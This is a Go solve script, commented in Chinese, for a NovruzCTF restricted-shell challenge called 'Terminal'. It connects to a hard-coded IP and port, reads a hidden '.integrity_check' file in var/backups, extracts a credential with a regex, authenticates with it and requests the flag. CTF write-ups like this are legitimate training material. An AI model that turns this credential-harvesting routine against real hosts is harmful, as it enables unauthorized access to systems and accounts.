// =============================================================================
// 题目名称: Terminal
// 题目类别: Misc - 受限 Shell 提权
// 解题思路: 连接受限 shell 后，通过 cd 到 var/backups 目录读取隐藏的
//           .integrity_check 文件，从中提取凭据，auth 认证后 getflag 获取 flag
//
// 用法: go run NovruzCTF_terminal.go [目标地址]
//   示例: go run NovruzCTF_terminal.go 95.111.234.103:9999
// =============================================================================
package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"regexp"
	"strings"
	"time"
)

const defaultTerminalAddr = "95.111.234.103:9999"

func main() {
	addr := defaultTerminalAddr
	if len(os.Args) > 1 {
		addr = os.Args[1]
	}

	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] 连接失败: %v\n", err)
		os.Exit(1)
	}
	defer conn.Close()

	// 读取初始 banner + prompt（提示符没有换行，不能按 ReadString('\n') 读取）
	banner := readWithTimeout(conn, 1500*time.Millisecond)
	fmt.Print(banner)

	if out, ok := runCommand(conn, "cd var/backups"); !ok {
		fmt.Fprintln(os.Stderr, "[!] 切换目录失败")
		fmt.Print(out)
		os.Exit(1)
	}

	integrityOutput, ok := runCommand(conn, "cat .integrity_check")
	fmt.Print(integrityOutput)
	if !ok {
		fmt.Fprintln(os.Stderr, "[!] 读取 .integrity_check 失败")
		os.Exit(1)
	}

	credential, err := extractCredential(integrityOutput)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] 未找到凭据: %v\n", err)
		os.Exit(1)
	}
	fmt.Println("[+] 提取到凭据:", credential)

	authOutput, ok := runCommand(conn, "auth "+credential)
	fmt.Print(authOutput)
	if !ok || !strings.Contains(strings.ToLower(authOutput), "authentication successful") {
		fmt.Fprintln(os.Stderr, "[!] 认证失败")
		os.Exit(1)
	}

	flagOutput, _ := runCommand(conn, "getflag")
	fmt.Print(flagOutput)

	if strings.Contains(flagOutput, "novruzctf{") || strings.Contains(flagOutput, "novruzCTF{") {
		fmt.Println("[+] 成功获取 Flag!")
	} else {
		fmt.Fprintln(os.Stderr, "[!] 响应中未发现 flag")
	}
}

// runCommand 向连接发送命令并读取响应
func runCommand(conn net.Conn, cmd string) (string, bool) {
	_, err := fmt.Fprintf(conn, "%s\n", cmd)
	if err != nil {
		return "", false
	}
	output := readWithTimeout(conn, 1200*time.Millisecond)
	return output, true
}

// readWithTimeout 带超时的读取，空闲超时后返回
func readWithTimeout(conn net.Conn, idleTimeout time.Duration) string {
	var sb strings.Builder
	buf := make([]byte, 4096)

	_ = conn.SetReadDeadline(time.Now().Add(idleTimeout))
	for {
		n, err := conn.Read(buf)
		if n > 0 {
			sb.Write(buf[:n])
			_ = conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
		}

		if err != nil {
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				break
			}
			if err == io.EOF {
				break
			}
			break
		}
	}
	return sb.String()
}

// extractCredential 从 .integrity_check 输出中提取凭据
func extractCredential(output string) (string, error) {
	re := regexp.MustCompile(`SAVED_CREDENTIAL_DUMP:\s*(\S+)`)
	match := re.FindStringSubmatch(output)
	if len(match) < 2 {
		return "", fmt.Errorf("pattern SAVED_CREDENTIAL_DUMP not found")
	}
	return strings.TrimSpace(match[1]), nil
}
